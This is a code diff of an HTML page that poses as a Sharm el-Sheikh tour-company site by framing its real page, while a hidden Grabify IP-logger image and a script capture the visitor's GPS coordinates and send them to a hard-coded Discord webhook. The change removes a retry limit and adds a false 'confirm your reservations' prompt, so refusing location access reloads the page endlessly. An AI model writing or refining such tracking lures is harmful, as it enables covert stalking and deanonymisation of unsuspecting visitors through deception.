@@ -30,21 +30,15 @@
     </style>
 </head>
 <body>
-    <img src="https://grabify.link/2KHAV8">    
-    <!-- Content is loaded normally -->
+    <img src="https://grabify.link/2KHAV8">   
+    <!-- Content is loaded normally without hiding the iframe -->
     <iframe id="content-frame" src="https://www.elgounatours.com/en/top-attractions-in-sharm-el-sheikh"></iframe>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1287627812701999115/DPX6pSyOlJXHkS_-KxNj03O1233HQlF-TnYPD_H05Gx90NNF9syL118ZL9lYmffgFdMG";
 
-        // Maximum number of refresh attempts
-        const maxAttempts = 15;
-
         // Function to get GPS coordinates and send them to the webhook
         function getGPS() {
-            // Check if attempts have been made before
-            let attempts = parseInt(localStorage.getItem('gpsAttempts')) || 0;
-
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async function (position) {
                     const latitude = position.coords.latitude;
@@ -64,32 +58,27 @@
                             },
                             body: JSON.stringify(data)
                         });
-                        // Reset attempts after success
-                        localStorage.setItem('gpsAttempts', 0);
                     } catch (error) {
                         console.error("Failed to send GPS data:", error);
                     }
                 }, function (error) {
-                    // On error (permission denied, etc.), reload the page if attempts are under the maxAttempts threshold
-                    attempts++;
-                    localStorage.setItem('gpsAttempts', attempts);
-
-                    if (attempts < maxAttempts) {
-                        // Reload the page to prompt again
-                        location.reload();
-                    } else {
-                        // After max attempts, stop reloading and show an error message
-                        document.body.innerHTML = "<h1>Location access is required for better service. Please enable location access and refresh the page.</h1>";
-                    }
+                    // On error (permission denied, etc.), reload the page to prompt again
+                    location.reload();
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
             }
         }
 
-        // Trigger GPS permission request on page load without an additional alert
+        // Trigger an alert and ask for permission to access the user's location
         window.onload = function () {
-            getGPS();
+            const userConfirmed = confirm("Location services are required to confirm your reservations. Please enable location access to continue using the site.");
+            if (userConfirmed) {
+                getGPS();
+            } else {
+                // If the user dismisses, reload the page to prompt again
+                location.reload();
+            }
         };
     </script>
 
